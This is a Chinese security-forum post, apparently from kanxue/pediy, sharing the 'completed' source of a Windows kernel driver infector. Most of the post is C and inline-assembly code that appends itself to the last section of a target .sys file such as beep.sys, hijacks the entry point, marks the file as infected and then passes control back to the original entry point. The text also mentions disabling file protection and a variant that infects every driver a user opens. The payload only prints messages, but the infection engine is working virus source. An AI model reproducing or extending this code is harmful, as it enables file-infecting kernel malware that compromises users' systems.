
# 完整的驱动感染 code 编译通过

> 原文：`www.pediy.com/kssd/pediy10/65628.html`

**完整的驱动感染 code 编译通过**

```c
/*  

* Module: InfectDriver.c  

*  

* Author : 老 Y (源自 kanxue,不过老 Y 放的 code 不完整,需要自己补充)  

* Fixer : sudami [sudami@163.com]  

* Time : 08/05/28  

*  

* Comment:  

*  

* 半年前一大牛在 kanxue 进行“驱动感染”扫盲,偶当时没搞明白.半年后突然想起来,于是  

* 尝试学习下.由于偶太菜,弄了几个小半天.终于调试成功. 关键点在于计算驱动自身的  

* 大小, 编译完驱动后,要用 IDA 打开它:  

* 1. 计算出第一个变量到 call $+5 处的偏移量.  

* 2. 计算 ulEndaddr 到文件末尾的偏移量.一般就是 INIT 的那一小段 dd.  

*  

* Description:  

*  

* 此驱动的功能很简单,可自己扩充,感染成功后,仅仅创建一个线程不断的打印信息.  

* 自己扩充功能时,要时刻记着对于全局变量和函数,都得重新定位,用作者提供的  

* KGetGlobalVarAddr() 函数即可. 对感染部分进行了详细的注释,对此很陌生的同学  

* 可以参考参考.  

*****  

*  

* 若想感染 beep.sys、null.sys 等系统文件,记得先去掉 SFP.当然,像微点这样的主动防御  

* 软件已经不允许修改 Driver 目录下的 sys 了. 需要自己想办法;  

*  

* zjjmj2002 大牛以前写过一个驱动感染的 sys,小小的扭曲过,会挂钩 NtOpenFile 以实现感染  

* 用户访问的驱动文件. 很好很邪恶~~~~ - -  

*****  

*  

* Copyright (c) 2008 sudami.  

* Freely distributable in source or binary for noncommercial purposes.  

* This is not a virus, So take it easy, just for fun.  

*  

*/  
```

发出来让还没接触过这些的同学少走些弯路，免得像偶一样调试半天才补完整~~ `![](img/792ac17acdd6fd3e39fc1aacdcf4c3d9.jpg "124.gif")`  

**切勿用于非法用途.**  

2 处关键部分如下：  

```c
/**  

*@brief 感染指定的文件  

*  

*@param[in]  pwszFileName 要感染的驱动文件名  

*@param[in]  ulNewEntryPointDelta DriverEntry 函数址与感染体首地址之间的差值  

*@return 返回 STATUS_SUCCESS 表示成功,其它值表示失败  

*/  

int KInfect(WCHAR *pwszFileName, ULONG ulNewEntryPointDelta)  

{      

    __asm{  

    call my_Next  

my_Next:  

    pop eax  

    sub eax, 5  

    mov ulDelta,eax  

    }   

    ultmp = ulDelta - 0x14B7;   

    ulBodySize = ulEndAddr - ultmp + 0x34;   

    nRetCode = KPEInitFromFileW(  

        &pe,  

        pwszFileName  

        );  

    if (!NT_SUCCESS(nRetCode))  {   

             goto Exit0;  

    }  

    if (pe.pDosHdr->e_csum == 0x5748)  { //感染标记   

            goto Exit0;  

    }  

    ulSecNum = KPEGetSecNum(&pe);  

    if (!ulSecNum)  {   

            goto Exit0;  

    }  

    //  

    // 对齐  

    // Misc.VirtualSize - 文件中的节长度.即对齐前的节尺寸  

    // SizeOfRawData - 内存中的节长度,即对齐后的节尺寸  

    //  

    ulFileAlignment = pe.pNtHdr->OptionalHeader.FileAlignment; // 段在文件中的对齐方式  

    ulSectionAlignment = pe.pNtHdr->OptionalHeader.SectionAlignment; // 段加载后在内存中的对齐方式。  

    pe.pSecHdr[ulSecNum - 1].SizeOfRawData =   

        ((pe.pSecHdr[ulSecNum - 1].SizeOfRawData - 1) / ulFileAlignment + 1) * ulFileAlignment;  

    pe.pSecHdr[ulSecNum - 1].Misc.VirtualSize =   

        ((pe.pSecHdr[ulSecNum - 1].Misc.VirtualSize - 1) / ulFileAlignment + 1) * ulFileAlignment;  

    //  

    // PointerToRawData - 节基于文件的偏移量,可根据它在文件中找到节  

    // ulNewFilePos - 新的写入点地址,即最后一个节的末尾处  

    // e_ip - 初始的指令指针值, e_cs -  初始的代码段相对偏移量值  

    // AddressOfEntryPoint -  程序入口 RVA  

    //  

    // 新的程序入口改为了感染体最后一个节,病毒体内的 DriverEntry 处  

    //  

    ulNewFilePos = pe.pSecHdr[ulSecNum - 1].SizeOfRawData + pe.pSecHdr[ulSecNum - 1].PointerToRawData;  

    pe.pDosHdr->e_ip = (USHORT)(pe.pNtHdr->OptionalHeader.AddressOfEntryPoint & 0xFFFF);  

    pe.pDosHdr->e_cs = (USHORT)( (pe.pNtHdr->OptionalHeader.AddressOfEntryPoint >> 16) & 0xFFFF);  

    pe.pNtHdr->OptionalHeader.AddressOfEntryPoint =   

        ulNewEntryPointDelta +   

        pe.pSecHdr[ulSecNum - 1].VirtualAddress +   

        pe.pSecHdr[ulSecNum - 1].Misc.VirtualSize;  

    //  

    // 增加最后一个节的长度, + ulBodySize,为感染体自身的大小  

    //  

    pe.pSecHdr[ulSecNum - 1].SizeOfRawData += ulBodySize;  

    pe.pSecHdr[ulSecNum - 1].Misc.VirtualSize += ulBodySize;  

    //  

    // 写感染标记  

    // e_csum 为校验和  

    //  

    pe.pDosHdr->e_csum = 0x5748;     

    nRetCode = KSeek(pe.hFile, ulNewFilePos);  

    if (!NT_SUCCESS(nRetCode)) {   

            goto Exit0;  

    }  

    nRetCode = KWriteFile(  

        pe.hFile,  

        (PVOID)ultmp, // 起始的 Buffer 地址,这里为病毒第一个全局变量的地址  

        ulBodySize,  

        &ulReturnLength  

        );  

    if (!NT_SUCCESS(nRetCode)) {   

             goto Exit0;  

    }  

    pe.pNtHdr->OptionalHeader.SizeOfImage =   

        pe.pSecHdr[ulSecNum - 1].VirtualAddress + pe.pSecHdr[ulSecNum - 1].Misc.VirtualSize;  

    pe.pSecHdr[ulSecNum - 1].Characteristics |= (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE);  

    pe.pSecHdr[ulSecNum - 1].Characteristics &= (~IMAGE_SCN_MEM_DISCARDABLE);  

    //  

    //  

    //  

    nRetCode = KSeek(pe.hFile, 0);  

    if (!NT_SUCCESS(nRetCode)) {   

            goto Exit0;  

    }   

    ..........   

Exit0:  

    KDelete(pe.pSecHdr);  

    pe.pSecHdr = NULL;  

    KDelete(pe.pNtHdr);  

    pe.pNtHdr = NULL;  

    KDelete(pe.pDosHdr);  

    pe.pDosHdr = NULL;  

    KClose(pe.hFile);  

    return nResult;  

}  

//  

// 本驱动会感染 System32\Drivers\beep.sys，感染方式为更改最后一个节的大小， 

// 然后写入感染体代码，被感染的驱动加载成功的表现为每隔一秒种使用 DbgPrint 输出 I'm here 

// 可以在 Windbg 或 DbgView 查看 

//  

NTSTATUS   

DriverEntry(  

    IN PDRIVER_OBJECT DriverObject,   

    IN PUNICODE_STRING RegistryPath  

    )  

{  

    .... 

Exit0:  

    __asm 

    { 

        push offset g_ulOrgEntryPoint 

        call KGetGlobalVarAddr 

        mov eax, [eax] 

        or eax,eax 

        jz Exit1 

        push eax  // 保存 eax - 原来的 EOP 

        call KCreateSystemThread  // 干我们想干的事情 

        pop eax  // 恢复 eax - 原来的 EOP 

        pop    edi 

        pop    esi 

        pop    ebx 

        mov    esp, ebp 

        pop    ebp 

        jmp eax  // JMP 回程序的原入口继续执行 

    } 

Exit1:         

    __asm 

    { 

            mov    eax, 0C0000001h 

            pop    edi 

            pop    esi 

            pop    ebx 

            mov    esp, ebp 

            pop    ebp 

            retn    8 

    } 

} 
```

`![](img/896a5cb96a1c70a3242f1227498abab1.jpg)`

上传的附件

| `![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg)` | | 驱动感染成功.V 1.0.080528_sudami.rar [解压密码：pediy]   
|
